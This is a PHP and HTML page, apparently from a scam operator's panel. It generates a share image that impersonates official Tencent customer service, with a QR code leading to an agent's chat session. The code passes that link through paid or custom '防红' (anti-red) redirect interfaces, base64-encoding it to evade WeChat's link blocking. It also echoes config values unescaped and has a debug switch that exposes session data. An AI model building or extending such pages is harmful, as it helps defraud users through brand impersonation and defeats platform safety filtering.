<?php
if (!defined('FROM_ROUTER')) {
    http_response_code(403);
    exit('喜乐科技@x60898');
}
session_start();
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/dbconfig.php';
checkLogin();

$currentAgent = $_SESSION['username'];

function generateCustomerName($length = 6) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// 生成XEDATA令牌
function generateXEDataToken() {
    return md5(uniqid(mt_rand(), true));
}

// 创建会话记录到 XE-SKDJWKSNCDATA 表
function createChatSession($sessionId, $customerName, $agentAccount, $platform = '微信') {
    $db = getDB();
    if (!$db) return false;
    
    $xedataToken = generateXEDataToken();
    $expiresAt = date('Y-m-d H:i:s', strtotime('+7 days'));
    
    $stmt = $db->prepare("INSERT INTO `XE-SKDJWKSNCDATA` 
                         (session_id, xedata_token, customer_name, agent_account, expires_at, platform) 
                         VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssss", $sessionId, $xedataToken, $customerName, $agentAccount, $expiresAt, $platform);
    
    if ($stmt->execute()) {
        return $xedataToken;
    }
    return false;
}

$customerName = generateCustomerName();
$sessionId = 'a' . $customerName . 'z-p' . $currentAgent . 's';
// 生成XEDATA令牌并保存到数据库
$xedataToken = createChatSession($sessionId, $customerName, $currentAgent, '微信');

$currentDomain = $_SERVER['HTTP_HOST'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$baseUrl = $protocol . "://" . $currentDomain;
$originalServiceUrl = $baseUrl . '/' . "ChatWechat" . '?id=' . $sessionId;

// 添加XEDATA参数
if ($xedataToken) {
    $originalServiceUrl .= '&XEDATA=' . $xedataToken;
}

// 获取防红配置（修复版，调整优先级）
function getAntiRedConfig($username) {
     $db = getDB();
    if (!$db) return null;
    
    // 1. 首先检查防红开关是否开启
    $stmt = $db->prepare("SELECT apply_status FROM user_anti_red_config WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
    $config = $result->fetch_assoc();
    
    if (!$config) {
        // 如果没有配置记录，默认防红开关开启
        $apply_status = 'on';
    } else {
        $apply_status = $config['apply_status'];
    }
    
    // 如果防红开关关闭，直接返回null
    if ($apply_status === 'off') {
        return null;
    }
    
    // 2. 防红开关开启的情况下，检查session中是否有应用的接口（付费或免费）
    if (isset($_SESSION['applied_api_url']) && !empty($_SESSION['applied_api_url'])) {
        $type = $_SESSION['applied_domain_type'] ?? 'paid';
        $applied_domain = $_SESSION['applied_domain'] ?? '付费接口';
        
        return [
            'api_url' => $_SESSION['applied_api_url'],
            'apply_status' => 'on',
            'applied_domain' => $applied_domain,
            'encoding_mode' => 'base64',
            'type' => $type
        ];
    }
    
    // 3. 检查session中是否有自定义接口
    if (isset($_SESSION['custom_interface_url']) && !empty($_SESSION['custom_interface_url'])) {
        return [
            'api_url' => $_SESSION['custom_interface_url'],
            'apply_status' => 'on',
            'applied_domain' => isset($_SESSION['custom_interface_remark']) ? $_SESSION['custom_interface_remark'] : '自定义接口',
            'encoding_mode' => isset($_SESSION['custom_encoding_mode']) ? $_SESSION['custom_encoding_mode'] : 'base64',
            'type' => 'custom'
        ];
    }
    
    // 4. 从数据库查询用户配置
    if ($config['apply_status'] === 'on' && !empty($config['applied_domain'])) {
        $applied_domain = $config['applied_domain'];
        
        // 先尝试从免费接口表中查找
        $freeStmt = $db->prepare("SELECT api_url FROM freeantired WHERE name = ? AND status = 'active'");
        $freeStmt->bind_param("s", $applied_domain);
        $freeStmt->execute();
        $freeResult = $freeStmt->get_result();
        
        if ($freeResult->num_rows > 0) {
            // 是免费接口
            $freeData = $freeResult->fetch_assoc();
            $config['api_url'] = $freeData['api_url'];
            $config['type'] = 'free';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 再尝试从付费接口表中查找
        $paidStmt = $db->prepare("SELECT api_url FROM anti_red_links WHERE domain_name = ? AND sold_to = ?");
        $paidStmt->bind_param("ss", $applied_domain, $username);
        $paidStmt->execute();
        $paidResult = $paidStmt->get_result();
        
        if ($paidResult->num_rows > 0) {
            // 是付费接口
            $paidData = $paidResult->fetch_assoc();
            $config['api_url'] = $paidData['api_url'];
            $config['type'] = 'paid';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 如果都不是，检查是否是自定义接口（在 userantired 表中）
        $customStmt = $db->prepare("SELECT ua.api_url, ua.encoding 
                                    FROM userantired ua 
                                    JOIN users u ON ua.user_id = u.id 
                                    WHERE u.username = ? AND ua.remark = ? AND ua.status = 'active'");
        $customStmt->bind_param("ss", $username, $applied_domain);
        $customStmt->execute();
        $customResult = $customStmt->get_result();
        
        if ($customResult->num_rows > 0) {
            // 是自定义接口
            $customData = $customResult->fetch_assoc();
            $config['api_url'] = $customData['api_url'];
            $config['encoding_mode'] = $customData['encoding'] ?? 'base64';
            $config['type'] = 'custom';
            return $config;
        }
    }
    
    return null;
}

$antiRedConfig = getAntiRedConfig($currentAgent);
$serviceUrl = $originalServiceUrl;

// 读取源站URL配置
$db = getDB();
$webconfigResult = $db->query("SELECT site_url, site_url_enabled FROM webconfig ORDER BY id DESC LIMIT 1");
$siteUrlConfig = null;
if ($webconfigResult && $webconfigResult->num_rows > 0) {
    $siteUrlConfig = $webconfigResult->fetch_assoc();
}

if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])) {
    $encoding_mode = $antiRedConfig['encoding_mode'] ?? 'base64';
    
    // 根据编码模式处理URL
    switch ($encoding_mode) {
        case 'base64':
            $encodedUrl = base64_encode($originalServiceUrl);
            break;
        case 'urlencode':
        case 'url':
            $encodedUrl = urlencode($originalServiceUrl);
            break;
        case 'none':
        default:
            $encodedUrl = $originalServiceUrl;
            break;
    }
    
    $serviceUrl = $antiRedConfig['api_url'] . $encodedUrl;
    
    // 调试信息
    error_log("防红接口应用信息: " . json_encode([
        'type' => $antiRedConfig['type'] ?? 'unknown',
        'applied_domain' => $antiRedConfig['applied_domain'] ?? 'unknown',
        'api_url' => $antiRedConfig['api_url'],
        'encoding_mode' => $encoding_mode,
        'original_url' => $originalServiceUrl,
        'encoded_url' => $encodedUrl,
        'final_url' => $serviceUrl
    ]));
} elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])) {
    $serviceUrl = $siteUrlConfig['site_url'] . base64_encode($originalServiceUrl);
}

// 输出调试信息（开发环境中使用）
if (isset($_GET['debug'])) {
    echo "<!-- 防红配置信息: " . json_encode($antiRedConfig) . " -->\n";
    echo "<!-- 原始URL: $originalServiceUrl -->\n";
    echo "<!-- 最终URL: $serviceUrl -->\n";
    echo "<!-- Session状态: " . json_encode([
        'custom_interface_url' => $_SESSION['custom_interface_url'] ?? '未设置',
        'custom_encoding_mode' => $_SESSION['custom_encoding_mode'] ?? '未设置',
        'custom_interface_remark' => $_SESSION['custom_interface_remark'] ?? '未设置',
        'applied_api_url' => $_SESSION['applied_api_url'] ?? '未设置',
        'applied_domain' => $_SESSION['applied_domain'] ?? '未设置',
        'applied_domain_type' => $_SESSION['applied_domain_type'] ?? '未设置',
        'redirect_to_browser' => $_SESSION['redirect_to_browser'] ?? '未设置'
    ]) . " -->\n";
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>分享页</title>

	<link rel="stylesheet" href="/assets/bootstrap-icons.css">
    <link rel="stylesheet" href="/assets/SharePhoto/main.css">
    <link rel="stylesheet" href="/assets/SharePhoto/wechat.css">
    <style>
    .wechat-preview {
    max-height: calc(100% + 1px);
    min-height: calc(100% + 1px);
    max-width: 100%;
    min-width: 100%;
    position: relative;
    overflow: hidden;
}
</style>
</head>
<body><div id="app" data-v-app="">
		<div class="app-container">
			<div class="scroll-container">
				<div class="form-container">
					<div class="form-row">
                    <label>防红</label>
                    <a class="form-link anti-red-link" id="anti-red-status">
                            <?php 
                            if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on') {
                                echo '已配置 (' . $antiRedConfig['applied_domain'] . ')';
                            } else {
                                echo '未配置';
                            }
                            ?> </a>
                         <!-- 移除刷新按钮 -->
                    <div class="copy-link-btn" id="copy-link-btn">
                        <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="18" height="18">
                            <path
                                d="M761.088 715.3152a38.7072 38.7072 0 0 1 0-77.4144 37.4272 37.4272 0 0 0 37.4272-37.4272V265.0112a37.4272 37.4272 0 0 0-37.4272-37.4272H425.6256a37.4272 37.4272 0 0 0-37.4272 37.4272 38.7072 38.7072 0 1 1-77.4144 0 115.0976 115.0976 0 0 1 114.8416-114.8416h335.4624a115.0976 115.0976 0 0 1 114.8416 114.8416v335.4624a115.0976 115.0976 0 0 1-114.8416 114.8416z"
                                p-id="5993" fill="#515151"></path>
                            <path
                                d="M589.4656 883.0976H268.1856a121.1392 121.1392 0 0 1-121.2928-121.2928v-322.56a121.1392 121.1392 0 0 1 121.2928-121.344h321.28a121.1392 121.1392 0 0 1 121.2928 121.2928v322.56c1.28 67.1232-54.1696 121.344-121.2928 121.344zM268.1856 395.3152a43.52 43.52 0 0 0-43.8784 43.8784v322.56a43.52 43.52 0 0 0 43.8784 43.8784h321.28a43.52 43.52 0 0 0 43.8784-43.8784v-322.56a43.52 43.52 0 0 0-43.8784-43.8784z"
                                p-id="5994" fill="#515151"></path>
                        </svg>
                        <div>复制链接</div>
                    </div>
                </div>
				</div>
				<!-- 预览区域开始 -->
				<div class="wechat-preview XE-container">
					<div class="XE-background">
						<img src="/assets/img/wx/3.png" class="XE-bg-image">
						<div class="XE-content">
							<img src="/assets/img/wx/4.svg" class="XE-logo">
							<div class="XE-card">
								<img class="XE-title" src="/assets/img/wx/5.png">
								<div class="XE-flex-row">
									<div class="XE-description" style="margin: 0px;">为进一步提升服务质量，特推出腾讯专属客服服务通道。扫描二维码联系腾讯专业客服团队，为您提供一对一的问题解答与支持。</div>
									<div id="qrcode"></div>
								</div>
							</div>
							<div class="XE-card">
								<img class="XE-title" src="/assets/img/wx/6.png">
								<div class="XE-description">在腾讯客服服务号进行智能问答、人工服务</div>
								<img src="/assets/img/wx/7.png" alt="" style="width: 100%; margin-top: 0.75rem;">
								<div class="XE-button">前往联系「腾讯客服」</div>
							</div>
							<div class="XE-card">
								<img src="/assets/img/wx/8.png" class="XE-feature-image" alt="">
								<div class="XE-features">
									<img class="XE-title" src="/assets/img/wx/9.png" alt="">
									<div class="XE-feature-card blue">
										<div class="XE-feature-header">
											<img class="XE-feature-icon" src="/assets/img/wx/10.svg" alt="">
											<div class="XE-feature-button">去使用</div>
										</div>
										<div class="XE-feature-desc">协助家长做好家庭教育及管理，引导孩子健康上网。汇聚志愿者分享教育经验，帮助家长科学监护孩子成长</div>
									</div>
									<img class="XE-title margin-top" src="/assets/img/wx/11.png" alt="">
									<div class="XE-feature-card purple">
										<div class="XE-feature-header">
											<img class="XE-feature-icon"
												src="data:image/svg+xml,%3csvg%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20167%2047'%20class='design-iconfont'%3e%3cpath%20d='M38.8153%2024.4465C35.794%2032.2959%2029.9837%2038.7139%2022.5%2042.5C15.3417%2038.8524%209.67085%2032.8038%206.55653%2025.37L10.4146%2026.3858C13.1106%2031.6495%2017.3405%2036.0358%2022.4535%2038.9909C28.4497%2035.5279%2033.191%2030.1258%2035.7475%2023.6154L24.2663%2020.568L22.1281%2026.3396L5.34799%2021.8609C5.02261%2020.7527%204.74372%2019.6446%204.55779%2018.4903C4.18593%2016.551%204%2014.5194%204%2012.4878C4%2011.8414%204%2011.2412%204.04648%2010.5948C9.20603%206.76245%2015.5741%204.5%2022.5%204.5C29.4259%204.5%2035.794%206.76245%2040.9535%2010.5948C41%2011.195%2041%2011.8414%2041%2012.4878C41%2014.5656%2040.8141%2016.5972%2040.4422%2018.5826L37.4673%2017.7515C37.7462%2016.0431%2037.9322%2014.2886%2037.9322%2012.4878C37.9322%2012.3955%2037.9322%2012.3032%2037.9322%2012.2108C33.5163%209.25577%2028.2173%207.54739%2022.5%207.54739C16.7827%207.54739%2011.4837%209.25577%207.06784%2012.2108C7.06784%2012.3032%207.06784%2012.3955%207.06784%2012.4878C7.06784%2014.8888%207.34673%2017.1974%207.85804%2019.4137L20.2688%2022.692L22.407%2016.9204L39.7915%2021.5377C39.5126%2022.5073%2039.1872%2023.4769%2038.8153%2024.4465Z'%20fill='%23fff'/%3e%3cpath%20d='M75.5841%2020.3363C76.3319%2021.6881%2078.8053%2022.8385%2080.3296%2023.2124L79.5819%2025.7434C78.2301%2025.4558%2077.0221%2024.9093%2075.958%2024.219L75.2677%2027.2677H76.677C77.6836%2027.2677%2078.3739%2027.4403%2078.1726%2028.6482C77.8274%2030.8341%2077.3097%2033.7965%2076.8208%2036.385H69.0265L68.5088%2034.0553H74.0885L74.8938%2030.115C74.9801%2029.7124%2074.8075%2029.5398%2074.4049%2029.5398H64.5973L65.5177%2024.823C64.5973%2025.2257%2063.6482%2025.542%2062.7279%2025.7434L63.3319%2022.8673C65.2301%2022.3496%2066.9845%2021.458%2068.1637%2020.3363H63.8208L64.281%2018.0929H69.6881C69.9181%2017.6903%2070.1195%2017.2301%2070.292%2016.7699H64.5111L64.9712%2014.469H66.9558L66.2655%2011.0177H69.2854C69.4867%2012.1681%2069.7168%2013.2323%2069.9757%2014.469H71.0111C71.2987%2013.1748%2071.4425%2011.9381%2071.5288%2010.5288H74.5774C74.4911%2011.9381%2074.3473%2013.2323%2074.0597%2014.469H75.1814C75.6991%2013.4049%2076.1593%2012.1681%2076.5332%2011.0177H79.5531C79.1217%2012.2257%2078.6327%2013.3761%2078.0863%2014.469H80.2146L79.6681%2016.7699H73.3695C73.2257%2017.2301%2073.0243%2017.6615%2072.8518%2018.0929H80.5597L80.0133%2020.3363H75.5841ZM62.6128%2011.2765C64.0796%2011.2765%2064.6549%2011.5354%2064.4248%2012.9447L60.2544%2036.385H57.3208L59.0177%2027.3827H57.0619C56.4004%2030.6903%2055.6239%2033.7677%2054.8761%2036.385H52C52.8628%2033.5664%2053.6394%2030.5177%2054.3009%2027.2102L57.1482%2011.2765H62.6128ZM61.4624%2014.2677C61.5487%2013.8075%2061.3761%2013.7212%2060.9447%2013.7212H59.5066L58.7301%2018.0929H60.7434L61.4624%2014.2677ZM72.5929%2020.3363H71.5288C71.0111%2021.0553%2070.3208%2021.7743%2069.4867%2022.4358H73.9447C73.3982%2021.8031%2072.9381%2021.0841%2072.5929%2020.3363ZM59.4491%2025.0243L60.3119%2020.4226H58.2987L57.4934%2025.0243H59.4491ZM68.0487%2027.2677H72.3053L72.8805%2024.6217H67.0133L68.365%2025.542L68.0487%2027.2677ZM73.1681%2030.6903L72.6504%2032.9336H62.7279L62.3252%2030.6903H73.1681Z'%20fill='%23fff'/%3e%3cpath%20d='M91.1726%2016.7699H88.0376C87.6925%2014.7566%2087.3186%2012.7434%2086.9734%2010.7301H89.9646L91.1726%2016.7699ZM106.416%2010.9889C108.17%2010.9889%20108.458%2011.5066%20108.199%2012.9447C107.02%2019.531%20105.726%2026.9513%20104.546%2033.4801H108.113L107.077%2036.1549H100.865C101.757%2031.1792%20102.504%2026.8075%20103.166%2023.0111H98.5642L96.2633%2036.1549H93.0996L95.4004%2023.0111H91.4602L91.9491%2020.5664H95.8319L96.9248%2014.4115L99.7146%2016.4823L98.9956%2020.5664H103.597C104%2018.2367%20104.374%2016.1372%20104.719%2014.354C104.863%2013.6062%20104.546%2013.5199%20103.885%2013.5199H93.2721L92.6969%2010.9889H106.416ZM90.2522%2018.2942L88.0664%2030.5752C89.2456%2029.7124%2090.5973%2028.6195%2091.8628%2027.6128L91.1726%2031.3518C89.1018%2033.0199%2086.427%2034.8606%2083.7234%2036.5L86.6283%2020.8252H83.6659L84.0973%2018.2942H90.2522Z'%20fill='%23fff'/%3e%3cpath%20d='M130.777%2026.3186L132.387%2014.6704C132.416%2014.4403%20132.33%2014.2389%20132.042%2014.2389H124.909L122.321%2033.365H135.81L135.378%2036.0973H110.644L111.046%2033.365H118.812L121.458%2014.2389H114.785L114.181%2011.6504H134.458C135.608%2011.6504%20136.155%2012.1681%20135.954%2013.6062L133.854%2028.9071H126.232L125.513%2026.3186H130.777Z'%20fill='%23fff'/%3e%3cpath%20d='M166.354%2020.854H155.597L153.843%2033.1925H163.765L163.449%2035.9535H140.239L140.584%2033.1925H150.305L152.117%2020.854H141.447L141.907%2018.0929H152.52L153.613%2010.5H157.093L156%2018.0929H166.757L166.354%2020.854Z'%20fill='%23fff'/%3e%3c/svg%3e"
												alt="">
											<div class="XE-feature-button">去举报</div>
										</div>
										<div class="XE-feature-desc">打击存在违法违规行为的微信/QQ账号，为用户提供全面的安全教育内容。共筑清朗环境，捍卫用户权益</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<!-- 预览区域结束 -->
			</div>
		</div>
	</div>
	
	<script>
		// 生成二维码 - 使用PHP动态生成的链接
		var qrCodeUrl = "<?php echo $serviceUrl; ?>";
		
		document.addEventListener('DOMContentLoaded', function() {
		    // 生成客服二维码
		    var qrcodeContainer = document.getElementById("qrcode");
		    try {
		        new QRCode(qrcodeContainer, {
		            text: qrCodeUrl,
		            width: getQRSize(qrCodeUrl, 110),
		            height: getQRSize(qrCodeUrl, 110),
		            colorDark: "#000000",
		            colorLight: "#ffffff",
		            correctLevel: getQRCorrectLevel(qrCodeUrl)
		        });
		    } catch(e) {
		        console.error('QR码生成失败，尝试降级:', e);
		        try {
		            qrcodeContainer.innerHTML = '';
		            new QRCode(qrcodeContainer, {
		                text: qrCodeUrl,
		                width: 140,
		                height: 140,
		                colorDark: "#000000",
		                colorLight: "#ffffff",
		                correctLevel: QRCode.CorrectLevel.L
		            });
		        } catch(e2) {
		            qrcodeContainer.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;width:110px;height:110px;background:#f5f5f5;border-radius:8px;color:#999;font-size:12px;text-align:center;padding:10px;">二维码生成失败</div>';
		        }
		    }
		    
		    // 在二维码中间添加logo图标
		    var logoImg = document.createElement('img');
		    logoImg.src = '/assets/img/wechat.jpg';
		    logoImg.style.position = 'absolute';
		    logoImg.style.top = '50%';
		    logoImg.style.left = '50%';
		    logoImg.style.transform = 'translate(-50%, -50%)';
		    logoImg.style.width = '20px';
		    logoImg.style.height = '20px';
		    logoImg.style.borderRadius = '24px';
		    logoImg.style.background = 'white';
		    logoImg.style.padding = '2px';
		    logoImg.style.boxShadow = '0 0 4px rgba(0,0,0,0.2)';
		    qrcodeContainer.style.position = 'relative';
		    qrcodeContainer.appendChild(logoImg);
			
			// 复制功能
			var copyLinkBtn = document.getElementById('copy-link-btn');
		    if (copyLinkBtn) {
		        copyLinkBtn.addEventListener('click', function() {
		            var linkToCopy = qrCodeUrl;
		            
		            // 使用现代 Clipboard API
		            if (navigator.clipboard && navigator.clipboard.writeText) {
		                navigator.clipboard.writeText(linkToCopy)
		                    .then(function() {
		                        showToast('链接已复制到剪贴板！');
		                    })
		                    .catch(function(err) {
		                        console.error('复制失败:', err);
		                        fallbackCopy(linkToCopy);
		                    });
		            } else {
		                fallbackCopy(linkToCopy);
		            }
		        });
		    }
			});
	</script>
	<script src="/assets/qrcode.min.js"></script>
	<script src="/assets/qrcode-helper.js"></script>
	<script>
	function showToast(message, type) {
        var container = document.getElementById('notification-container');
        if (!container) {
            container = document.createElement('div');
            container.id = 'notification-container';
            container.className = 'notification-container';
            document.body.appendChild(container);
        }

        var toast = document.createElement('div');
        toast.className = 'new-user-toast notification-enter-active';
        if (type) {
            toast.classList.add(type);
        }

        var icon = document.createElement('div');
        icon.className = 'toast-icon';
        icon.textContent = type === 'error' ? '!' : '✓';
        toast.appendChild(icon);

        var text = document.createElement('div');
        text.className = 'toast-text';
        text.textContent = message;
        toast.appendChild(text);

        var closeBtn = document.createElement('button');
        closeBtn.className = 'toast-close';
        closeBtn.innerHTML = '&times;';
        closeBtn.addEventListener('click', function() {
            removeToast(toast);
        });
        toast.appendChild(closeBtn);

        container.appendChild(toast);

        setTimeout(function() {
            toast.classList.add('notification-leave-active');
            setTimeout(function() {
                removeToast(toast);
            }, 300);
        }, 4000);

        function removeToast(toast) {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }
    }

    function fallbackCopy(text) {
        var textArea = document.createElement('textarea');
        textArea.value = text;
        textArea.style.position = 'fixed';
        textArea.style.opacity = '0';
        textArea.style.left = '-9999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        
        try {
            var successful = document.execCommand('copy');
            if (successful) {
                showToast('链接已复制到剪贴板！');
            } else {
                showToast('复制失败，请手动复制', 'error');
            }
        } catch (err) {
            console.error('复制失败:', err);
            showToast('复制失败，请手动复制', 'error');
        }
        
        document.body.removeChild(textArea);
    }
	</script>
</body>
</html>